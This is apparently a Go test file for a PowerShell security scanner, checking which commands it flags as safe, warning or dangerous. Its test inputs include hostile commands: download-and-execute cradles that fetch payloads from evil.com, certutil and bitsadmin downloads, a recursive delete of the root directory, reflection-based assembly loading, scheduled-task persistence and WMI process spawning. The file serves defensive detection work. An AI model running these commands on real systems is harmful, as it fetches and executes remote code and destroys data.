package powershell

import (
	"testing"
)

// =============================================================================
// Safe commands — none of the 24 validators should fire
// =============================================================================

func TestSecurityScannerSafeCommands(t *testing.T) {
	scanner := NewSecurityScanner()

	safeCommands := []string{
		"Get-ChildItem C:\\",
		"Get-Content file.txt",
		"Get-Process",
		"Set-Location /tmp",
		"Write-Output hello",
		"Get-Service",
		"Select-String pattern file.txt",
		"ls",
		"cat file.txt",
		"git status",
		"npm install",
		"mkdir newdir",
	}

	for _, cmd := range safeCommands {
		t.Run(cmd, func(t *testing.T) {
			result := scanner.Scan(cmd)
			if result.Level != RiskLevelSafe {
				t.Errorf("expected safe for %q, got level=%d msg=%q", cmd, result.Level, result.Message)
			}
		})
	}
}

// =============================================================================
// Phase 1 validators (6 checks)
// =============================================================================

func TestSecurityScannerEncodedCommand(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command   string
		dangerous bool
	}{
		{"pwsh -EncodedCommand SGVsbG8=", true},
		{"pwsh -e SGVsbG8=", true},
		{"powershell -EncodedCommand SGVsbG8=", true},
		{"Get-ChildItem C:\\", false},
		{"Write-Output hello", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.dangerous && result.Level < RiskLevelDangerous {
				t.Errorf("expected dangerous for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.dangerous && result.Level >= RiskLevelDangerous {
				t.Errorf("expected safe for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

func TestSecurityScannerInvokeExpression(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command   string
		dangerous bool
	}{
		{"Invoke-Expression 'malicious'", true},
		{"iex 'malicious'", true},
		{"Get-ChildItem; iex 'payload'", true},
		{"Get-Process", false},
		{"Write-Output test", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.dangerous && result.Level < RiskLevelDangerous {
				t.Errorf("expected dangerous for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.dangerous && result.Level >= RiskLevelDangerous {
				t.Errorf("expected safe for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

func TestSecurityScannerDownloadCradle(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command   string
		dangerous bool
	}{
		{"Invoke-WebRequest http://evil.com/payload.ps1 | Invoke-Expression", true},
		{"iwr http://evil.com/payload.ps1 | iex", true},
		{"Invoke-RestMethod http://evil.com/data | iex", true},
		{"Get-ChildItem C:\\", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.dangerous && result.Level < RiskLevelDangerous {
				t.Errorf("expected dangerous for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.dangerous && result.Level >= RiskLevelDangerous {
				t.Errorf("expected safe for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

func TestSecurityScannerAddType(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command   string
		dangerous bool
	}{
		{"Add-Type -TypeDefinition 'public class E { }'", true},
		{"Get-Process", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.dangerous && result.Level < RiskLevelDangerous {
				t.Errorf("expected dangerous for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.dangerous && result.Level >= RiskLevelDangerous {
				t.Errorf("expected safe for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

func TestSecurityScannerScriptBlockInjection(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command   string
		dangerous bool
	}{
		{"Invoke-Command -ScriptBlock { Remove-Item / -Recurse }", true},
		{"Start-Job -ScriptBlock { Write-Output test }", true},
		{"Get-Process | Where-Object { $_.CPU -gt 100 }", false},
		{"Get-ChildItem | Sort-Object { $_.Name }", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.dangerous && result.Level < RiskLevelDangerous {
				t.Errorf("expected dangerous for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.dangerous && result.Level >= RiskLevelDangerous {
				t.Errorf("expected safe for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

func TestSecurityScannerNestedPowerShell(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command string
		warning bool
	}{
		{"pwsh -Command Get-Process", true},
		{"powershell -Command Get-Process", true},
		{"Get-ChildItem C:\\", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.warning && result.Level < RiskLevelWarning {
				t.Errorf("expected >= warning for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.warning && result.Level >= RiskLevelWarning {
				t.Errorf("expected safe for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

// =============================================================================
// Phase 2 validators (18 new checks)
// =============================================================================

func TestSecurityScannerDynamicCommandName(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command string
		unsafe  bool
	}{
		{"& $function:Invoke-Expression 'payload'", true},
		{"& ('iex','x')[0] 'payload'", true},
		{"Get-Process", false},
		// {"Invoke-Expression 'test'", false}, // caught by checkInvokeExpression
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.unsafe && result.Level < RiskLevelWarning {
				t.Errorf("expected >= warning for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.unsafe && result.Level >= RiskLevelDangerous {
				t.Errorf("expected no dangerous for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

func TestSecurityScannerDownloadUtilities(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command   string
		dangerous bool
	}{
		{"Start-BitsTransfer http://evil.com/payload.exe C:\\out.exe", true},
		{"certutil -urlcache http://evil.com/payload.exe C:\\out.exe", true},
		{"certutil /urlcache http://evil.com/payload.exe", true},
		{"bitsadmin /transfer job http://evil.com/payload.exe C:\\out.exe", true},
		{"certutil -encode input output", false}, // no -urlcache
		{"Get-ChildItem", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.dangerous && result.Level < RiskLevelDangerous {
				t.Errorf("expected dangerous for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.dangerous && result.Level >= RiskLevelDangerous {
				t.Errorf("expected safe for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

func TestSecurityScannerComObject(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command string
		warning bool
	}{
		{"New-Object -ComObject WScript.Shell", true},
		{"New-Object -ComObject Shell.Application", true},
		{"Get-Process", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.warning && result.Level < RiskLevelWarning {
				t.Errorf("expected >= warning for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.warning && result.Level >= RiskLevelDangerous {
				t.Errorf("expected no dangerous for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

func TestSecurityScannerDangerousFilePath(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command   string
		dangerous bool
	}{
		{"Invoke-Command -FilePath C:\\script.ps1", true},
		{"Start-Job -FilePath script.ps1", true},
		{"Start-ThreadJob -FilePath script.ps1", true},
		{"Register-ScheduledJob -FilePath C:\\script.ps1", true},
		{"Get-Process", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.dangerous && result.Level < RiskLevelDangerous {
				t.Errorf("expected dangerous for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.dangerous && result.Level >= RiskLevelDangerous {
				t.Errorf("expected safe for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

func TestSecurityScannerForEachMemberName(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command string
		warning bool
	}{
		{"Get-Process | ForEach-Object -MemberName Kill", true},
		{"Get-ChildItem | ForEach-Object -MemberName Delete", true},
		{"Get-Process | Where-Object { $_.CPU -gt 100 }", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.warning && result.Level < RiskLevelWarning {
				t.Errorf("expected >= warning for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.warning && result.Level >= RiskLevelDangerous {
				t.Errorf("expected no dangerous for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

func TestSecurityScannerStartProcess(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command   string
		dangerous bool
		warning   bool
	}{
		{"Start-Process -Verb RunAs -FilePath C:\\evil.exe", true, false},
		{"Start-Process pwsh -ArgumentList \"-Command iex\"", false, true},
		{"Get-Process", false, false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.dangerous && result.Level < RiskLevelDangerous {
				t.Errorf("expected dangerous for %q, got level=%d", tt.command, result.Level)
			}
			if tt.warning && result.Level < RiskLevelWarning {
				t.Errorf("expected >= warning for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.dangerous && !tt.warning && result.Level >= RiskLevelWarning {
				t.Errorf("expected safe for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

func TestSecurityScannerSubExpressions(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command string
		warning bool
	}{
		{"Write-Output $(Get-Process)", true},
		{"Get-ChildItem $($env:PATH)", true},
		{"Get-Process", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.warning && result.Level < RiskLevelWarning {
				t.Errorf("expected >= warning for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.warning && result.Level >= RiskLevelDangerous {
				t.Errorf("expected no dangerous for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

func TestSecurityScannerExpandableStrings(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command string
		warning bool
	}{
		{"Write-Output \"Hello $name\"", true},
		{"Write-Output \"Home: $env:HOME\"", true},
		{"Write-Output 'Hello $name'", false},  // single-quoted, safe
		{"Get-Process", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.warning && result.Level < RiskLevelWarning {
				t.Errorf("expected >= warning for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.warning && result.Level >= RiskLevelDangerous {
				t.Errorf("expected no dangerous for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

func TestSecurityScannerSplatting(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command string
		warning bool
	}{
		{"Get-ChildItem @params", true},
		{"Remove-Item @path", true},
		{"Get-Process", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.warning && result.Level < RiskLevelWarning {
				t.Errorf("expected >= warning for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.warning && result.Level >= RiskLevelDangerous {
				t.Errorf("expected no dangerous for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

func TestSecurityScannerStopParsing(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command string
		warning bool
	}{
		{"git log --% --format=%H", true},
		{"Get-Process", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.warning && result.Level < RiskLevelWarning {
				t.Errorf("expected >= warning for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.warning && result.Level >= RiskLevelDangerous {
				t.Errorf("expected no dangerous for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

func TestSecurityScannerMemberInvocations(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command string
		warning bool
	}{
		{"[System.IO.File]::ReadAllText('C:\\file.txt')", true},
		{"$obj.Method()", true},
		{"Get-Process", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.warning && result.Level < RiskLevelWarning {
				t.Errorf("expected >= warning for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.warning && result.Level >= RiskLevelDangerous {
				t.Errorf("expected no dangerous for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

func TestSecurityScannerTypeLiterals(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command   string
		dangerous bool
	}{
		{"[Reflection.Assembly]::Load('malicious.dll')", true},
		{"[Diagnostics.Process]::Start('cmd.exe')", true},
		{"[int]$x = 42", false},             // int is in CLM allowlist
		{"[string]$name = 'hello'", false},  // string is in CLM allowlist
		{"[DateTime]::Now", false},          // DateTime is in CLM allowlist
		{"Get-Process", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.dangerous && result.Level < RiskLevelDangerous {
				t.Errorf("expected dangerous for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.dangerous && result.Level >= RiskLevelDangerous {
				t.Errorf("expected safe for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

func TestSecurityScannerInvokeItem(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command   string
		dangerous bool
	}{
		{"Invoke-Item C:\\file.exe", true},
		{"ii C:\\document.pdf", true},
		{"Get-Process", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.dangerous && result.Level < RiskLevelDangerous {
				t.Errorf("expected dangerous for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.dangerous && result.Level >= RiskLevelDangerous {
				t.Errorf("expected safe for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

func TestSecurityScannerScheduledTask(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command   string
		dangerous bool
	}{
		{"Register-ScheduledTask -TaskName Evil -Action Execute", true},
		{"New-ScheduledTask -Action Execute", true},
		{"Set-ScheduledTask -TaskName Evil", true},
		{"schtasks /create /tn Evil /tr calc.exe", true},
		{"Get-ScheduledTask", false}, // read-only, not flagged
		{"Get-Process", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.dangerous && result.Level < RiskLevelDangerous {
				t.Errorf("expected dangerous for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.dangerous && result.Level >= RiskLevelDangerous {
				t.Errorf("expected safe for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

func TestSecurityScannerEnvVarManipulation(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command string
		warning bool
	}{
		{"Set-Item env:PATH newvalue", true},
		{"Remove-Item env:SECRET", true},
		{"New-Item env:MYVAR -Value test", true},
		{"Write-Output $env:PATH", false}, // read-only env var access
		{"Get-Process", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.warning && result.Level < RiskLevelWarning {
				t.Errorf("expected >= warning for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.warning && result.Level >= RiskLevelDangerous {
				t.Errorf("expected no dangerous for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

func TestSecurityScannerModuleLoading(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command   string
		dangerous bool
	}{
		{"Import-Module EvilModule", true},
		{"Install-Module -Name Malicious", true},
		{"Save-Module -Name Evil", true},
		{"Update-Module -Name Malicious", true},
		{"Install-Script -Name ScrapeData", true},
		{"Get-Module -ListAvailable", false}, // read-only
		{"Get-Process", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.dangerous && result.Level < RiskLevelDangerous {
				t.Errorf("expected dangerous for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.dangerous && result.Level >= RiskLevelDangerous {
				t.Errorf("expected safe for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

func TestSecurityScannerRuntimeStateManipulation(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command string
		warning bool
	}{
		{"Set-Alias Get-Content Invoke-Expression", true},
		{"New-Alias ll Get-ChildItem", true},
		{"Set-Variable PSDefaultParameterValues @{'*:Path'='/etc/passwd'}", true},
		{"New-Variable -Name test -Value 42", true},
		{"Get-Alias", false}, // read-only
		{"Get-Variable", false}, // read-only
		{"Get-Process", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.warning && result.Level < RiskLevelWarning {
				t.Errorf("expected >= warning for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.warning && result.Level >= RiskLevelDangerous {
				t.Errorf("expected no dangerous for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

func TestSecurityScannerWmiProcessSpawn(t *testing.T) {
	scanner := NewSecurityScanner()

	tests := []struct {
		command   string
		dangerous bool
	}{
		{"Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"cmd /c calc\"", true},
		{"Invoke-CimMethod -Class Win32_Process -Name Create", true},
		{"Get-WmiObject -Class Win32_Process", false}, // read-only query
		{"Get-CimInstance -Class Win32_Process", false}, // read-only
		{"Get-Process", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := scanner.Scan(tt.command)
			if tt.dangerous && result.Level < RiskLevelDangerous {
				t.Errorf("expected dangerous for %q, got level=%d", tt.command, result.Level)
			}
			if !tt.dangerous && result.Level >= RiskLevelDangerous {
				t.Errorf("expected safe for %q, got level=%d msg=%q", tt.command, result.Level, result.Message)
			}
		})
	}
}

// =============================================================================
// Edge cases
// =============================================================================

func TestSecurityScannerEmptyCommand(t *testing.T) {
	scanner := NewSecurityScanner()
	result := scanner.Scan("")
	if result.Level != RiskLevelSafe {
		t.Errorf("expected safe for empty command, got level=%d", result.Level)
	}
}

func TestSecurityScannerShortCircuitsOnDangerous(t *testing.T) {
	// A command with multiple dangerous patterns should short-circuit
	// on the first dangerous finding.
	scanner := NewSecurityScanner()
	result := scanner.Scan("Invoke-Expression 'test'; Add-Type -TypeDefinition 'public class E { }'")
	if result.Level != RiskLevelDangerous {
		t.Errorf("expected dangerous, got level=%d", result.Level)
	}
}

func TestSecurityScannerMultipleWarnings(t *testing.T) {
	// Multiple warnings should produce the highest warning level.
	scanner := NewSecurityScanner()
	result := scanner.Scan("Get-Process | ForEach-Object -MemberName Kill; `$(`$env:PATH)`")
	if result.Level < RiskLevelWarning {
		t.Errorf("expected >= warning, got level=%d", result.Level)
	}
}

func TestSecurityScannerDangerousBeatsWarning(t *testing.T) {
	// A command with both a warning and a dangerous pattern should
	// report dangerous.
	scanner := NewSecurityScanner()
	result := scanner.Scan("Start-Process -Verb RunAs -FilePath C:\\evil.exe; Add-Type -TypeDefinition 'public class E { }'")
	if result.Level != RiskLevelDangerous {
		t.Errorf("expected dangerous, got level=%d msg=%q", result.Level, result.Message)
	}
}
